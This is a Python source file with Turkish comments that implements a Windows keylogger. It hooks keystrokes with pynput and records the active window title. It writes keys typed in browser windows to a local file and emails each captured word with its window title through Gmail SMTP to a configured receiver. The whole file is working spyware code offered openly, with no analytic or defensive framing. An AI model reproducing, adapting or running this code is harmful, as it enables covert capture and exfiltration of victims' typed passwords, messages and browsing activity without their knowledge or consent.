import win32gui
from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

capsLock = False
word = []

def getDateYMDHIS():
    return datetime.today().strftime('%Y-%m-%d %H:%M:%S')

def getActiveWindow():
    window = win32gui.GetForegroundWindow()
    title = win32gui.GetWindowText(window)
    return title

def sendWord():
    active_window = getActiveWindow()
    if word:
        word_str = ''.join(word)
        print(f"{active_window}: {word_str} -> {getDateYMDHIS()}")
        send_email(active_window, word_str)
        word.clear()

def send_email(window_title, word):
    # E-posta ayarlarını burada yapılandırın
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    sender_email = ''
    sender_password = ''
    receiver_email = ''

    # E-posta gövdesini oluşturun
    subject = f"Word from {window_title}"
    body = f"Word: {word}\nTime: {getDateYMDHIS()}"
    message = MIMEText(body)
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = receiver_email

    # SMTP sunucusuna bağlanın ve e-postayı gönderin
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(message)
        print("E-posta gönderildi.")
    except Exception as e:
        print("E-posta gönderirken bir hata oluştu:", str(e))

def on_press(key):
    global capsLock
    global word

    active_window = getActiveWindow()

    if 'browser' in active_window.lower():
        with open("urls.txt", "a") as f:
            f.write(f"{active_window}: {key}\n")
            f.write(f"{active_window}: {win32gui.GetWindowText(win32gui.GetFocus())}\n")

    if key == Key.enter:
        print("Enter basildi")
        sendWord()
        return
    
    if key == Key.space:
        print("Space tusu basildi")
        sendWord()
        return
    
    if key == Key.shift or key == Key.shift_l or key == Key.shift_r:
        print("Shift tusuna basildi")
    
    if key == Key.caps_lock:
        if capsLock == False:
            capsLock = True
            print("Caps lock acildi")
        else:
            capsLock = False
            print("Caps lock kapandi")
        return

    if key.char.isalpha():
        if capsLock:
            word.append(key.char.upper())
        else:
            word.append(key.char.lower())

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
